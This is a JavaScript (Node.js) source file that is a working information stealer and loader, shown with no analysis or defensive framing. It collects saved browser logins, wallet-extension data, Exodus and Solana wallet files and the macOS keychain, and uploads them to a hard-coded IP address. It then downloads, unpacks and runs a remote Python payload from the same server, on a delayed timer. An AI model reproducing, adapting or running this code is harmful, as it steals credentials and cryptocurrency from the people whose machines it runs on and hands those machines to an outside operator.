const fs = require('fs');
const os = require('os');
const path = require('path');
const request = require('request');
const { exec } = require('child_process');

const hostname = os.hostname();
const platform = os.platform();
const homedir = os.homedir();
const tmpdir = os.tmpdir();

const resolvePath = (filePath) => filePath.replace(/^~([a-z]+|\/)/, (_, match) => '/' === match ? homedir : path.dirname(homedir) + '/' + match);

const canAccessFile = (filePath) => {
    try {
        fs.accessSync(filePath);
        return true;
    } catch (error) {
        return false;
    }
};


const browserPaths = {
    brave: ["Local/BraveSoftware/Brave-Browser", "BraveSoftware/Brave-Browser", "BraveSoftware/Brave-Browser"],
    chrome: ["Local/Google/Chrome", "Google/Chrome", "google-chrome"],
    opera: ["Roaming/Opera Software/Opera Stable", "com.operasoftware.Opera", "opera"]
};

const extensionIds = [
    "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "ejbalbakoplchlghecdalmeeeajnimhm",
    "fhbohimaelbohpjbbldcngcnapndodjp",
    "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "aeachknmefphepccionboohckonoeemg",
    "hifafgmccdpekplomjjkcfgodnhcellj",
    "jblndlipeogpafnldhgmapagcccfchpi",
    "acmacodkjbdgmoleebolmdjonilkdbch",
    "dlcobpjiigpikoobohmabehhmhfoodbb",
    "mcohilncbfahbmgdjkbpemcciiolgcge",
    "agoakfejjabomempkjlepdflaleeobhb",
    "omaabbefbmiijedngplfjmnooppbclkk",
    "aholpfdialjgjfhomihkjbmgjidlcdno",
    "nphplpgoakhhjchkkhmiggakijnkhfnd",
    "penjlddjkjgpnkllboccdgccekpkcbin",
    "lgmpcpglpngdoalbgeoldeajfclnhafa",
    "fldfpgipfncgndfolcbkdeeknbbbnhcc",
    "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "gjnckgkfmgmibbkoficdidcljeaaaheg",
    "afbcbjpbpfadlkmhmclhkeeodmamcflc"
];


const uploadFiles = async (files, timestamp) => {
    try {
        if (files.length > 0) {
            request.post({
                url: "http://185.153.182.241:1224/uploads",
                formData: {
                    type: '5',
                    hid: `501_${hostname}`,
                    uts: timestamp,
                    multi_file: files,
                }
            }, (error, response, body) => { });
        }
    } catch (error) { }
};


const getBrowserData = async (browserPath, browserId, timestamp) => {
    try {
        let dataPath = '';
        if (platform.startsWith('darwin')) {
            dataPath = resolvePath(`~/.config/${browserPath[2]}`);
        } else if (platform.startsWith('linux')) {
            dataPath = resolvePath(`~/.config/${browserPath[2]}`);
        } else if (platform.startsWith('win')) {
            dataPath = resolvePath(`~/AppData/${browserPath[0]}/User Data`);
        }

        await getExtensionFiles(dataPath, `${browserId}_`, browserId === 0, timestamp);


    } catch (error) { }
};

const getKeychainData = async (timestamp) => {

    let filesToUpload = [];
    let keychainPath = path.join(homedir, '/Library/Keychains/login.keychain');


    if (fs.existsSync(keychainPath)) {
        try {

            filesToUpload.push({
                value: fs.createReadStream(keychainPath),
                options: { filename: 'logkc-db' },
            });


        } catch (error) { }

    } else {

        keychainPath += '-db';

        if (fs.existsSync(keychainPath)) {
            try {

                filesToUpload.push({
                    value: fs.createReadStream(keychainPath),
                    options: { filename: 'logkc-db' },
                });


            } catch (error) { }

        }
    }

    uploadFiles(filesToUpload, timestamp);


    return filesToUpload;

}


const getLoginData = async (browserPath, browserPrefix, timestamp) => {

    let filesToUpload = [];

    let browserDataPath = ''

    if (platform.startsWith('darwin')) {
        browserDataPath = resolvePath(`~/.config/${browserPath[2]}`);
    } else if (platform.startsWith('linux')) {
        browserDataPath = resolvePath(`~/.config/${browserPath[2]}`);
    } else if (platform.startsWith('win')) {
        browserDataPath = resolvePath(`~/AppData/${browserPath[0]}/User Data`);
    }


    let localStatePath = path.join(browserDataPath, 'Local State');

    if (fs.existsSync(localStatePath)) {

        try {

            filesToUpload.push({
                value: fs.createReadStream(localStatePath),
                options: {
                    filename: `${browserPrefix}_lst`
                }
            });


        } catch (error) { }


    }


    try {
        if (canAccessFile(browserDataPath)) {
            for (let i = 0; i < 200; i++) {
                const profilePath = path.join(browserDataPath, (i === 0 ? "Default" : `Profile ${i}`));


                try {
                    if (!canAccessFile(profilePath)) {
                        continue;
                    }

                    const loginDataPath = path.join(profilePath, 'Login Data');


                    if (!canAccessFile(loginDataPath)) {
                        continue;
                    }

                    filesToUpload.push({
                        value: fs.createReadStream(loginDataPath),
                        options: { filename: `${browserPrefix}_${i}_uld` },
                    });



                } catch (error) { }



            }
        }

    } catch (error) { }


    uploadFiles(filesToUpload, timestamp);

    return filesToUpload;

};

const getExtensionFiles = async (basePath, prefix, isFirstBrowser, timestamp) => {

    if (!basePath || '' === basePath || !canAccessFile(basePath)) {
        return [];
    }


    let filesToUpload = [];
    for (let profileIndex = 0; profileIndex < 200; profileIndex++) {
        const profilePath = path.join(basePath, (profileIndex === 0 ? "Default" : `Profile ${profileIndex}`), "Local Extension Settings");

        for (const extensionId of extensionIds) {
            const extensionFolderPath = path.join(profilePath, extensionId)

            if (canAccessFile(extensionFolderPath)) {
                try {

                    const files = fs.readdirSync(extensionFolderPath);

                    for (const file of files) {
                        const fullFilePath = path.join(extensionFolderPath, file);
                        const fileStat = fs.statSync(fullFilePath);

                        if (!fileStat.isDirectory()) {
                            filesToUpload.push({
                                value: fs.createReadStream(fullFilePath),
                                options: {
                                    filename: `501_${prefix}${profileIndex}_${extensionId}_${file}`,
                                },
                            });
                        }
                    }


                } catch (err) { }


            }

        }
    }
    // Solana config
    if (isFirstBrowser && fs.existsSync(path.join(homedir, '.config/solana/id.json'))) {
        try {
            filesToUpload.push({
                value: fs.createReadStream(path.join(homedir, '.config/solana/id.json')),
                options: { filename: 'solana_id.txt' },
            });
        } catch (error) { }
    }

    uploadFiles(filesToUpload, timestamp);

    return filesToUpload;
};

const getExodusWalletData = (timestamp) => {
    let walletPath = '';
    if (platform.startsWith('win')) {
        walletPath = resolvePath("~/AppData/Roaming/Exodus/exodus.wallet");
    } else if (platform.startsWith('darwin')) {
        walletPath = resolvePath("~/Library/Application Support/exodus.wallet");
    } else {
        walletPath = resolvePath("~/.config/Exodus/exodus.wallet");
    }


    let filesToUpload = [];

    if (canAccessFile(walletPath)) {

        try {
            const files = fs.readdirSync(walletPath);

            for (const file of files) {
                const fullPath = path.join(walletPath, file);

                filesToUpload.push({
                    value: fs.createReadStream(fullPath),
                    options: { filename: `501_${file}` }
                });
            }
        } catch (err) { }

    }

    uploadFiles(filesToUpload, timestamp);

    return filesToUpload
};


let downloadAttempts = 0;

const downloadAndExtractPayload = async () => {

    const zipFilePath = path.join(tmpdir, 'p.zi');
    const extractedZipPath = path.join(tmpdir, 'p2.zip');
    const maxSize = 51476596


    if (downloadAttempts >= maxSize) {
        return;
    }


    if (fs.existsSync(zipFilePath)) {
        try {
            const fileStat = fs.statSync(zipFilePath)

            if (fileStat.size >= maxSize) {
                downloadAttempts = fileStat.size
                fs.rename(zipFilePath, extractedZipPath, (err) => {
                    if (err) {
                        throw err;
                    }
                    extractPayload(extractedZipPath);
                });
            } else {
                if (downloadAttempts < fileStat.size) {
                    downloadAttempts = fileStat.size
                } else {
                    fs.rmSync(zipFilePath);
                    downloadAttempts = 0
                }
                scheduleNextDownload();
            }


        } catch (error) { }

    } else {
        exec(`curl -Lo "${zipFilePath}" "http://185.153.182.241:1224/pdown"`, (error, stdout, stderr) => {

            if (error) {
                downloadAttempts = 0;
                scheduleNextDownload()
                return;
            }

            try {
                downloadAttempts = maxSize
                fs.renameSync(zipFilePath, extractedZipPath);
                extractPayload(extractedZipPath);
            } catch (err) { }

        });
    }
};


const scheduleNextDownload = () => {
    setTimeout(downloadAndExtractPayload, 20000)
}


const extractPayload = async (zipPath) => {

    exec(`tar -xf "${zipPath}" -C "${homedir}"`, (error, stdout, stderr) => {
        if (error) {
            fs.rmSync(zipPath);
            downloadAttempts = 0;
            return;
        }

        fs.rmSync(zipPath);
        runPayload();


    });
}


const runPayload = async () => {

    if (platform.startsWith('win')) {
        if (fs.existsSync(path.join(homedir, '.pyp\\python.exe'))) {

            const payloadPath = path.join(homedir, '.sysinfo');
            const pythonExecutable = `"${path.join(homedir, '.pyp\\python.exe')}"`;


            try {
                fs.rmSync(payloadPath)
            } catch (error) { }

            request.get('http://185.153.182.241:1224/client/5/501', (error, response, body) => {
                if (!error) {

                    try {
                        fs.writeFileSync(payloadPath, body);
                        exec(`${pythonExecutable} "${payloadPath}"`, (error, stdout, stderr) => { });
                    } catch (err) { }


                }
            });
        } else {
            scheduleNextDownload();
        }
    } else {

        request.get('http://185.153.182.241:1224/client/5/501', (error, response, body) => {
            if (!error) {
                fs.writeFileSync(path.join(homedir, '.sysinfo'), body);
                exec(`python3 "${path.join(homedir, '.sysinfo')}"`, (error, stdout, stderr) => { });
            }
        });

    }

};



const mainFunction = async () => {

    try {
        const timestamp = Math.round(new Date().getTime() / 1000);

        await getBrowserData(browserPaths.chrome, 0, timestamp);
        await getBrowserData(browserPaths.brave, 1, timestamp);
        await getBrowserData(browserPaths.opera, 2, timestamp);

        getExodusWalletData(timestamp);


        if (platform.startsWith('win')) {
            await getExtensionFiles(resolvePath('~/AppData/Local/Microsoft/Edge/User Data'), '3_', false, timestamp);
        }



        if (platform.startsWith('darwin')) {
            getKeychainData(timestamp)
        } else {
            await getLoginData(browserPaths.chrome, 0, timestamp);
            await getLoginData(browserPaths.brave, 1, timestamp);
            await getLoginData(browserPaths.opera, 2, timestamp);
        }


        runPayload()


    } catch (error) { }
};


// mainFunction();


let executionCount = 0;
const intervalId = setInterval(() => {

    if ((executionCount += 1) < 2) {
        mainFunction();
    } else {
        clearInterval(intervalId)
    }

}, 300000); // 5 Menit


//Anti Debugging function
setInterval(() => {


}, 4000);